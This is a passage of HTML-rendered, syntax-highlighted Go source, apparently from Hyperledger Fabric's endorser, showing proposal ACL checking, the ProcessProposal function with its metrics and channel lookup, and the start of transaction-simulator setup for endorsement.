		&lt;span style=&#34;color:#75715e&#34;&gt;// check that the proposal complies with the Channel&amp;#39;s writers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CheckACL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProposal&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalACLCheckFailed&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
		}
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// ProcessProposal process the Proposal
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorser&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;ProcessProposal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Context&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;signedProp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProposal&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#75715e&#34;&gt;// start time for computing elapsed time metric for successfully endorsed proposals
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;startTime&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Now&lt;/span&gt;()
	&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalsReceived&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

	&lt;span style=&#34;color:#a6e22e&#34;&gt;addr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ExtractRemoteAddress&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;endorserLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debug&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;request from&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;addr&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// variables to capture proposal duration metric
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;

	&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;UnpackProposal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;signedProp&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalValidationFailed&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Message&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;()}}, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelFetcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;())
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Message&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel &amp;#39;%s&amp;#39; not found&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;)}}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
		}
	} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Channel&lt;/span&gt;{
			&lt;span style=&#34;color:#a6e22e&#34;&gt;IdentityDeserializer&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;LocalMSP&lt;/span&gt;,
		}
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// 0 -- check and validate
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;preProcess&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Message&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;()}}, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;() {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{
			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;channel&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;,
			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;strconv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FormatBool&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;),
		}
		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalDuration&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;With&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;meterLabels&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Observe&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Since&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;startTime&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Seconds&lt;/span&gt;())
	}()

	&lt;span style=&#34;color:#a6e22e&#34;&gt;pResp&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProcessProposalSuccessfullyOrError&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Message&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;()}}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pResp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorsement&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// We mark the tx as successfull only if it was successfully endorsed, or
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// if it was a system chaincode on a channel-less channel and therefore
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// cannot be endorsed.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;

		&lt;span style=&#34;color:#75715e&#34;&gt;// total failed proposals = ProposalsReceived-SuccessfulProposals
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metrics&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SuccessfulProposals&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pResp&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorser&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;ProcessProposalSuccessfullyOrError&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;UnpackedProposal&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalResponse&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TransactionParams&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;:  &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;TxID&lt;/span&gt;:       &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProp&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProposal&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;Proposal&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Proposal&lt;/span&gt;,
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decorateLogger&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;endorserLogger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;)

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;acquireTxSimulator&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;) {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;txSim&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTxSimulator&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxID&lt;/span&gt;())
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
		}

		&lt;span style=&#34;color:#75715e&#34;&gt;// txsim acquires a shared lock on the stateDB. As this would impact the block commits (i.e., commit
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// of valid write-sets to the stateDB), we must release the lock as early as possible.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Hence, this txsim object is closed in simulateProposal() as soon as the tx is simulated and
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// rwset is collected before gossip dissemination if required for privateData. For safety, we
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// add the following defer statement and is useful when an error occur. Note that calling
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// txsim.Done() more than once does not cause any issue. If the txsim is already
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// released, the following txsim.Done() simply returns.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;txSim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;()

		&lt;span style=&#34;color:#a6e22e&#34;&gt;hqe&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetHistoryQueryExecutor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;())
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
		}

		&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;txSim&lt;/span&gt;
		&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HistoryQueryExecutor&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;hqe&lt;/span&gt;
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;cdLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEndorsementInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TXSimulator&lt;/span&gt;)
